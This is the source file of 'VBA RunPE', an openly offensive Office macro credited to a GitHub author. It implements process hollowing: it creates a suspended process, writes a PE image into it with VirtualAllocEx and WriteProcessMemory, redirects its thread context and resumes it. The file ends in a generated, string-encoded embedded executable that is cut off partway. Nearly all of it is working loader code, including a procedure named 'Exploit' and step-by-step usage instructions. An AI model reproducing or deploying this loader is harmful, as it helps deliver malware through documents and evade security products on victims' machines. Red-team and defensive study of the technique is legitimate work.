' --------------------------------------------------------------------------------
' Title: VBA RunPE
' Filename: RunPE.vba
' GitHub: https://github.com/itm4n/VBA-RunPE
' Date: 2019-12-14
' Author: Clement Labro (@itm4n)
' Description: A RunPE implementation in VBA with Windows API calls. It is
'   compatible with both 32 bits and 64 bits versions of Microsoft Office.
'   The 32 bits version of Office can only run 32 bits executables and the 64 bits
'   version can only run 64 bits executables.
' Usage: 1. In the 'Exploit' procedure at the end of the code, set the path of the
'               file you want to execute (with optional arguments)
'        2. Enable View > Immediate Window (Ctrl + G) (to check execution and error
'               logs)
'        3. Run the macro!
' Tested on: - Windows 7 Pro 64 bits + Office 2016 32 bits
'            - Windows 10 Pro 64 bits + Office 2016 64 bits
' Credit: @hasherezade - https://github.com/hasherezade/ (RunPE written in C++
'   with dynamic relocations)
' --------------------------------------------------------------------------------

Option Explicit

' ================================================================================
'                      ~~~ IMPORT WINDOWS API FUNCTIONS ~~~
' ================================================================================
#If Win64 Then
    Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
    Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
#Else
    Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As Long, ByVal lLength As Long)
    Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
    Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
#End If


' ================================================================================
'                           ~~~ WINDOWS STRUCTURES ~~~
' ================================================================================
' Constants used in structure definitions
Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Private Const IMAGE_SIZEOF_SHORT_NAME = 8
Private Const MAXIMUM_SUPPORTED_EXTENSION = 512
Private Const SIZE_OF_80387_REGISTERS = 80

#If Win64 Then
    Private Type M128A
        Low As LongLong     'ULONGLONG Low;
        High As LongLong    'LONGLONG High;
    End Type
#End If

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html
Private Type IMAGE_DOS_HEADER
     e_magic As Integer         'WORD e_magic;
     e_cblp As Integer          'WORD e_cblp;
     e_cp As Integer            'WORD e_cp;
     e_crlc As Integer          'WORD e_crlc;
     e_cparhdr As Integer       'WORD e_cparhdr;
     e_minalloc As Integer      'WORD e_minalloc;
     e_maxalloc As Integer      'WORD e_maxalloc;
     e_ss As Integer            'WORD e_ss;
     e_sp As Integer            'WORD e_sp;
     e_csum As Integer          'WORD e_csum;
     e_ip As Integer            'WORD e_ip;
     e_cs As Integer            'WORD e_cs;
     e_lfarlc As Integer        'WORD e_lfarlc;
     e_ovno As Integer          'WORD e_ovno;
     e_res(4 - 1) As Integer    'WORD e_res[4];
     e_oemid As Integer         'WORD e_oemid;
     e_oeminfo As Integer       'WORD e_oeminfo;
     e_res2(10 - 1) As Integer  'WORD e_res2[10];
     e_lfanew As Long           'LONG e_lfanew;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680305(v=vs.85).aspx
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long      'DWORD   VirtualAddress;
    Size As Long                'DWORD   Size;
End Type

' undocumented
Private Type IMAGE_BASE_RELOCATION
    VirtualAddress As Long        'DWORD   VirtualAddress
    SizeOfBlock As Long           'DWORD   SizeOfBlock
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680313(v=vs.85).aspx
Private Type IMAGE_FILE_HEADER
    Machine As Integer                  'WORD    Machine;
    NumberOfSections As Integer         'WORD    NumberOfSections;
    TimeDateStamp As Long               'DWORD   TimeDateStamp;
    PointerToSymbolTable As Long        'DWORD   PointerToSymbolTable;
    NumberOfSymbols As Long             'DWORD   NumberOfSymbols;
    SizeOfOptionalHeader As Integer     'WORD    SizeOfOptionalHeader;
    Characteristics As Integer          'WORD    Characteristics;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx
Private Type IMAGE_OPTIONAL_HEADER
    #If Win64 Then
        Magic As Integer                        'WORD        Magic;
        MajorLinkerVersion As Byte              'BYTE        MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE        MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD       SizeOfCode;
        SizeOfInitializedData As Long           'DWORD       SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD       SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD       AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD       BaseOfCode;
        ImageBase As LongLong                   'ULONGLONG   ImageBase;
        SectionAlignment As Long                'DWORD       SectionAlignment;
        FileAlignment As Long                   'DWORD       FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD        MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD        MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD        MajorImageVersion;
        MinorImageVersion As Integer            'WORD        MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD        MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD        MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD       Win32VersionValue;
        SizeOfImage As Long                     'DWORD       SizeOfImage;
        SizeOfHeaders As Long                   'DWORD       SizeOfHeaders;
        CheckSum As Long                        'DWORD       CheckSum;
        Subsystem As Integer                    'WORD        Subsystem;
        DllCharacteristics As Integer           'WORD        DllCharacteristics;
        SizeOfStackReserve As LongLong          'ULONGLONG   SizeOfStackReserve;
        SizeOfStackCommit As LongLong           'ULONGLONG   SizeOfStackCommit;
        SizeOfHeapReserve As LongLong           'ULONGLONG   SizeOfHeapReserve;
        SizeOfHeapCommit As LongLong            'ULONGLONG   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD       LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD       NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #Else
        Magic As Integer                        'WORD    Magic;
        MajorLinkerVersion As Byte              'BYTE    MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE    MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD   SizeOfCode;
        SizeOfInitializedData As Long           'DWORD   SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD   SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD   AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD   BaseOfCode;
        BaseOfData As Long                      'DWORD   BaseOfData;
        ImageBase As Long                       'DWORD   ImageBase;
        SectionAlignment As Long                'DWORD   SectionAlignment;
        FileAlignment As Long                   'DWORD   FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD    MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD    MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD    MajorImageVersion;
        MinorImageVersion As Integer            'WORD    MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD    MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD    MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD   Win32VersionValue;
        SizeOfImage As Long                     'DWORD   SizeOfImage;
        SizeOfHeaders As Long                   'DWORD   SizeOfHeaders;
        CheckSum As Long                        'DWORD   CheckSum;
        Subsystem As Integer                    'WORD    Subsystem;
        DllCharacteristics As Integer           'WORD    DllCharacteristics;
        SizeOfStackReserve As Long              'DWORD   SizeOfStackReserve;
        SizeOfStackCommit As Long               'DWORD   SizeOfStackCommit;
        SizeOfHeapReserve As Long               'DWORD   SizeOfHeapReserve;
        SizeOfHeapCommit As Long                'DWORD   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD   LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD   NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #End If
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680336(v=vs.85).aspx
Private Type IMAGE_NT_HEADERS
    Signature As Long                         'DWORD Signature;
    FileHeader As IMAGE_FILE_HEADER           'IMAGE_FILE_HEADER FileHeader;
    OptionalHeader As IMAGE_OPTIONAL_HEADER   'IMAGE_OPTIONAL_HEADER OptionalHeader;
End Type

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_SECTION_HEADER.html
Private Type IMAGE_SECTION_HEADER
    SecName(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte 'UCHAR Name[IMAGE_SIZEOF_SHORT_NAME];
    Misc As Long                    'ULONG Misc;
    VirtualAddress As Long          'ULONG VirtualAddress;
    SizeOfRawData As Long           'ULONG SizeOfRawData;
    PointerToRawData As Long        'ULONG PointerToRawData;
    PointerToRelocations As Long    'ULONG PointerToRelocations;
    PointerToLinenumbers As Long    'ULONG PointerToLinenumbers;
    NumberOfRelocations As Integer  'WORD  NumberOfRelocations;
    NumberOfLinenumbers As Integer  'WORD  NumberOfLinenumbers;
    Characteristics As Long         'ULONG Characteristics;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
Private Type PROCESS_INFORMATION
    hProcess As LongPtr     'HANDLE hProcess;
    hThread As LongPtr      'HANDLE hThread;
    dwProcessId As Long     'DWORD  dwProcessId;
    dwThreadId As Long      'DWORD  dwThreadId;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
Private Type STARTUPINFO
    cb As Long                  'DWORD  cb;
    lpReserved As String        'LPSTR  lpReserved;
    lpDesktop As String         'LPSTR  lpDesktop;
    lpTitle As String           'LPSTR  lpTitle;
    dwX As Long                 'DWORD  dwX;
    dwY As Long                 'DWORD  dwY;
    dwXSize As Long             'DWORD  dwXSize;
    dwYSize As Long             'DWORD  dwYSize;
    dwXCountChars As Long       'DWORD  dwXCountChars;
    dwYCountChars As Long       'DWORD  dwYCountChars;
    dwFillAttribute As Long     'DWORD  dwFillAttribute;
    dwFlags As Long             'DWORD  dwFlags;
    wShowWindow As Integer      'WORD   wShowWindow;
    cbReserved2 As Integer      'WORD   cbReserved2;
    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
    hStdInput As LongPtr        'HANDLE hStdInput;
    hStdOutput As LongPtr       'HANDLE hStdOutput;
    hStdError As LongPtr        'HANDLE hStdError;
End Type

' https://www.nirsoft.net/kernel_struct/vista/FLOATING_SAVE_AREA.html
Private Type FLOATING_SAVE_AREA
    ControlWord As Long                                 'DWORD ControlWord;
    StatusWord As Long                                  'DWORD StatusWord;
    TagWord As Long                                     'DWORD TagWord;
    ErrorOffset As Long                                 'DWORD ErrorOffset;
    ErrorSelector As Long                               'DWORD ErrorSelector;
    DataOffset As Long                                  'DWORD DataOffset;
    DataSelector As Long                                'DWORD DataSelector;
    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE  RegisterArea[SIZE_OF_80387_REGISTERS];
    Spare0 As Long                                      'DWORD Spare0;
End Type

' winnt.h
#If Win64 Then
    Private Type XMM_SAVE_AREA32
        ControlWord As Integer                  'WORD  ControlWord;
        StatusWord As Integer                   'WORD  StatusWord;
        TagWord As Byte                         'BYTE  TagWord;
        Reserved1 As Byte                       'BYTE  Reserved1;
        ErrorOpcode As Integer                  'WORD  ErrorOpcode;
        ErrorOffset As Long                     'DWORD ErrorOffset;
        ErrorSelector As Integer                'WORD  ErrorSelector;
        Reserved2 As Integer                    'WORD  Reserved2;
        DataOffset As Long                      'DWORD DataOffset;
        DataSelector As Integer                 'WORD  DataSelector;
        Reserved3 As Integer                    'WORD  Reserved3;
        MxCsr As Long                           'DWORD MxCsr;
        MxCsr_Mask As Long                      'DWORD MxCsr_Mask;
        FloatRegisters(8 - 1) As M128A          'M128A FloatRegisters[8];
        XmmRegisters(16 - 1) As M128A       'M128A XmmRegisters[16];
        Reserved4(96 - 1) As Byte           'BYTE  Reserved4[96];
End Type
#End If

Private Type CONTEXT
    #If Win64 Then
        ' Register parameter home addresses
        P1Home As LongLong                  'DWORD64 P1Home;
        P2Home As LongLong                  'DWORD64 P2Home;
        P3Home As LongLong                  'DWORD64 P3Home;
        P4Home As LongLong                  'DWORD64 P4Home;
        P5Home As LongLong                  'DWORD64 P5Home;
        P6Home As LongLong                  'DWORD64 P6Home;
        ' Control flags
        ContextFlags As Long                'DWORD ContextFlags;
        MxCsr As Long                       'DWORD MxCsr;
        ' Segment Registers and processor flags
        SegCs As Integer                    'WORD   SegCs;
        SegDs As Integer                    'WORD   SegDs;
        SegEs As Integer                    'WORD   SegEs;
        SegFs As Integer                    'WORD   SegFs;
        SegGs As Integer                    'WORD   SegGs;
        SegSs As Integer                    'WORD   SegSs;
        EFlags As Long                      'DWORD  EFlags;
        ' Debug registers
        Dr0 As LongLong                     'DWORD64 Dr0;
        Dr1 As LongLong                     'DWORD64 Dr1;
        Dr2 As LongLong                     'DWORD64 Dr2;
        Dr3 As LongLong                     'DWORD64 Dr3;
        Dr6 As LongLong                     'DWORD64 Dr6;
        Dr7 As LongLong                     'DWORD64 Dr7;
        ' Integer registers
        Rax As LongLong                     'DWORD64 Rax;
        Rcx As LongLong                     'DWORD64 Rcx;
        Rdx As LongLong                     'DWORD64 Rdx;
        Rbx As LongLong                     'DWORD64 Rbx;
        Rsp As LongLong                     'DWORD64 Rsp;
        Rbp As LongLong                     'DWORD64 Rbp;
        Rsi As LongLong                     'DWORD64 Rsi;
        Rdi As LongLong                     'DWORD64 Rdi;
        R8 As LongLong                      'DWORD64 R8;
        R9 As LongLong                      'DWORD64 R9;
        R10 As LongLong                     'DWORD64 R10;
        R11 As LongLong                     'DWORD64 R11;
        R12 As LongLong                     'DWORD64 R12;
        R13 As LongLong                     'DWORD64 R13;
        R14 As LongLong                     'DWORD64 R14;
        R15 As LongLong                     'DWORD64 R15;
        ' Program counter
        Rip As LongLong                     'DWORD64 Rip
        ' Floating point state
        FltSave As XMM_SAVE_AREA32          'XMM_SAVE_AREA32 FltSave;
        'Header(2 - 1) As M128A              'M128A Header[2];
        'Legacy(8 - 1) As M128A              'M128A Legacy[8];
        'Xmm0 As M128A                       'M128A Xmm0;
        'Xmm1 As M128A                       'M128A Xmm1;
        'Xmm2 As M128A                       'M128A Xmm2;
        'Xmm3 As M128A                       'M128A Xmm3;
        'Xmm4 As M128A                       'M128A Xmm4;
        'Xmm5 As M128A                       'M128A Xmm5;
        'Xmm6 As M128A                       'M128A Xmm6;
        'Xmm7 As M128A                       'M128A Xmm7;
        'Xmm8 As M128A                       'M128A Xmm8;
        'Xmm9 As M128A                       'M128A Xmm9;
        'Xmm10 As M128A                      'M128A Xmm10;
        'Xmm11 As M128A                      'M128A Xmm11;
        'Xmm12 As M128A                      'M128A Xmm12;
        'Xmm13 As M128A                      'M128A Xmm13;
        'Xmm14 As M128A                      'M128A Xmm14;
        'Xmm15 As M128A                      'M128A Xmm15;
        ' Vector registers
        VectorRegister(26 - 1) As M128A     'M128A   VectorRegister[26];
        VectorControl As LongLong           'DWORD64 VectorControl;
        ' Special debug control registers
        DebugControl As LongLong            'DWORD64 DebugControl;
        LastBranchToRip As LongLong         'DWORD64 LastBranchToRip;
        LastBranchFromRip As LongLong       'DWORD64 LastBranchFromRip;
        LastExceptionToRip As LongLong      'DWORD64 LastExceptionToRip;
        LastExceptionFromRip As LongLong    'DWORD64 LastExceptionFromRip;
    #Else
        ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx
        ContextFlags As Long                'DWORD ContextFlags;
        Dr0 As Long                         'DWORD Dr0;
        Dr1 As Long                         'DWORD Dr1;
        Dr2 As Long                         'DWORD Dr2;
        Dr3 As Long                         'DWORD Dr3;
        Dr6 As Long                         'DWORD Dr6;
        Dr7 As Long                         'DWORD Dr7;
        FloatSave As FLOATING_SAVE_AREA     'FLOATING_SAVE_AREA FloatSave;
        SegGs As Long                       'DWORD SegGs;
        SegFs As Long                       'DWORD SegFs;
        SegEs As Long                       'DWORD SegEs;
        SegDs As Long                       'DWORD SegDs;
        Edi As Long                         'DWORD Edi;
        Esi As Long                         'DWORD Esi;
        Ebx As Long                         'DWORD Ebx;
        Edx As Long                         'DWORD Edx;
        Ecx As Long                         'DWORD Ecx;
        Eax As Long                         'DWORD Eax;
        Ebp As Long                         'DWORD Ebp;
        Eip As Long                         'DWORD Eip;
        SegCs As Long                       'DWORD SegCs;  // MUST BE SANITIZED
        EFlags As Long                      'DWORD EFlags; // MUST BE SANITIZED
        Esp As Long                         'DWORD Esp;
        SegSs As Long                       'DWORD SegSs;
        ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte 'BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
    #End If
End Type


' ================================================================================
'                   ~~~ CONSTANTS USED IN WINDOWS API CALLS ~~~
' ================================================================================
Private Const MEM_COMMIT = &H1000
Private Const MEM_RESERVE = &H2000
Private Const PAGE_READWRITE = &H4
Private Const PAGE_EXECUTE_READWRITE = &H40
Private Const MAX_PATH = 260
Private Const CREATE_SUSPENDED = &H4

Private Const CONTEXT_AMD64 = &H100000
Private Const CONTEXT_I386 = &H10000
#If Win64 Then
    Private Const CONTEXT_ARCH = CONTEXT_AMD64
#Else
    Private Const CONTEXT_ARCH = CONTEXT_I386
#End If
Private Const CONTEXT_CONTROL = CONTEXT_ARCH Or &H1
Private Const CONTEXT_INTEGER = CONTEXT_ARCH Or &H2
Private Const CONTEXT_SEGMENTS = CONTEXT_ARCH Or &H4
Private Const CONTEXT_FLOATING_POINT = CONTEXT_ARCH Or &H8
Private Const CONTEXT_DEBUG_REGISTERS = CONTEXT_ARCH Or &H10
Private Const CONTEXT_EXTENDED_REGISTERS = CONTEXT_ARCH Or &H20
Private Const CONTEXT_FULL = CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS


' ================================================================================
'                     ~~~ CONSTANTS USED IN THE MAIN SUB ~~~
' ================================================================================
Private Const VERBOSE = False                       ' Set to True for debugging
Private Const IMAGE_DOS_SIGNATURE = &H5A4D          ' 0x5A4D      // MZ
Private Const IMAGE_NT_SIGNATURE = &H4550           ' 0x00004550  // PE00
Private Const IMAGE_FILE_MACHINE_I386 = &H14C       ' 32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     ' 64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const SIZEOF_IMAGE_DOS_HEADER = 64
Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
Private Const SIZEOF_IMAGE_FILE_HEADER = 20
Private Const SIZEOF_IMAGE_DATA_DIRECTORY = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION_ENTRY = 2
#If Win64 Then
    Private Const SIZEOF_IMAGE_NT_HEADERS = 264
    Private Const SIZEOF_ADDRESS = 8
#Else
    Private Const SIZEOF_IMAGE_NT_HEADERS = 248
    Private Const SIZEOF_ADDRESS = 4
#End If

' Data Directories
' |__ IMAGE_OPTIONAL_HEADER contains an array of 16 IMAGE_DATA_DIRECTORY structures
' |__ Each IMAGE_DATA_DIRECTORY structure as a "predefined role", as defined by these constants (in winnt.h)
Private Const IMAGE_DIRECTORY_ENTRY_EXPORT = 0       ' Export Directory
Private Const IMAGE_DIRECTORY_ENTRY_IMPORT = 1       ' Import Directory
Private Const IMAGE_DIRECTORY_ENTRY_RESOURCE = 2     ' Resource Directory
Private Const IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3    ' Exception Directory
Private Const IMAGE_DIRECTORY_ENTRY_SECURITY = 4     ' Security Directory
Private Const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5    ' Base Relocation Table
Private Const IMAGE_DIRECTORY_ENTRY_DEBUG = 6        ' Debug Directory
Private Const IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7    ' Description String
Private Const IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8    ' Machine Value (MIPS GP)
Private Const IMAGE_DIRECTORY_ENTRY_TLS = 9          ' TLS Directory
Private Const IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10 ' Load Configuration Directory


' ================================================================================
'                                ~~~ HELPERS ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    ByteArrayLength
' Desc:      Returns the length of a Byte array
' Arguments: baBytes - An array of Bytes
' Returns:   The size of the array as a Long
' --------------------------------------------------------------------------------
Public Function ByteArrayLength(baBytes() As Byte) As Long
    On Error Resume Next
    ByteArrayLength = UBound(baBytes) - LBound(baBytes) + 1
End Function

' --------------------------------------------------------------------------------
' Method:    ByteArrayToString
' Desc:      Converts an array of Bytes to a String
' Arguments: baBytes - An array of Bytes
' Returns:   The String representation of the Byte array
' --------------------------------------------------------------------------------
Private Function ByteArrayToString(baBytes() As Byte) As String
    Dim strRes As String: strRes = ""
    Dim iCount As Integer
    For iCount = 0 To ByteArrayLength(baBytes) - 1
        If baBytes(iCount) <> 0 Then
            strRes = strRes & Chr(baBytes(iCount))
        Else
            Exit For
        End If
    Next iCount
    ByteArrayToString = strRes
End Function

' --------------------------------------------------------------------------------
' Method:    FileToByteArray
' Desc:      Reads a file as a Byte array
' Arguments: strFilename - Fullname of the file as a String (ex:
'                'C:\Windows\System32\cmd.exe')
' Returns:   The content of the file as a Byte array
' --------------------------------------------------------------------------------
Private Function FileToByteArray(strFilename As String) As Byte()
    ' File content to String
    Dim strFileContent As String
    Dim iFile As Integer: iFile = FreeFile
    Open strFilename For Binary Access Read As #iFile
        strFileContent = Space(FileLen(strFilename))
        Get #iFile, , strFileContent
    Close #iFile
    
    ' String to Byte array
    Dim baFileContent() As Byte
    baFileContent = StrConv(strFileContent, vbFromUnicode)

    FileToByteArray = baFileContent
End Function

' --------------------------------------------------------------------------------
' Method:    StringToByteArray
' Desc:      Convert a String to a Byte array
' Arguments: strContent - Input String representing the PE
' Returns:   The content of the String as a Byte array
' --------------------------------------------------------------------------------
Private Function StringToByteArray(strContent As String) As Byte()
    Dim baContent() As Byte
    baContent = StrConv(strContent, vbFromUnicode)
    StringToByteArray = baContent
End Function

' --------------------------------------------------------------------------------
' Method:    A
' Desc:      Append a Char to a String.
' Arguments: strA - Input String. E.g.: "AAA"
'            bChar - Input Char as a Byte. E.g.: 66 or &H42
' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
' --------------------------------------------------------------------------------
Private Function A(strA As String, bChar As Byte) As String
    A = strA & Chr(bChar)
End Function

' --------------------------------------------------------------------------------
' Method:    B
' Desc:      Append a String to another String.
' Arguments: strA - Input String 1. E.g.: "AAAA"
'            strB - Input String 2. E.g.: "BBBB"
' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
' --------------------------------------------------------------------------------
Private Function B(strA As String, strB As String) As String
    B = strA + strB
End Function


' ================================================================================
'                                ~~~ EMBEDDED PE ~~~
' ================================================================================

' CODE GENERATED BY PE2VBA
' ===== BEGIN PE2VBA =====
Private Function PE0() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "MZ"), 144), 0), 3), 0), 0), 0), 4), 0), 0), 0), 255), 255), 0), 0), 184), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 232), 0), 0), 0), 14), 31), 186), 14), 0), 180), 9), 205), "!"), 184), 1), "L"), 205), "!This program cannot be")
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, " run in DOS mode."), 13), 13), 10), "$"), 0), 0), 0), 0), 0), 0), 0), 147), "8"), 240), 214), 215), "Y"), 158), 133), 215), "Y"), 158), 133), 215), "Y"), 158), 133), 172), "E"), 146), 133), 211), "Y")
    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 158), 133), "TE"), 144), 133), 222), "Y"), 158), 133), 184), "F"), 148), 133), 220), "Y"), 158), 133), 184), "F"), 154), 133), 212), "Y"), 158), 133), 215), "Y"), 159), 133), 30), "Y"), 158), 133), "TQ"), 195), 133), 223), "Y"), 158), 133), 131), "z"), 174), 133), 255), "Y"), 158), 133)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 16), "_"), 152), 133), 214), "Y"), 158), 133), "Rich"), 215), "Y"), 158), 133), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "PE"), 0), 0), "L"), 1), 4), 0), 19), 213), ";J"), 0), 0), 0), 0), 0), 0)
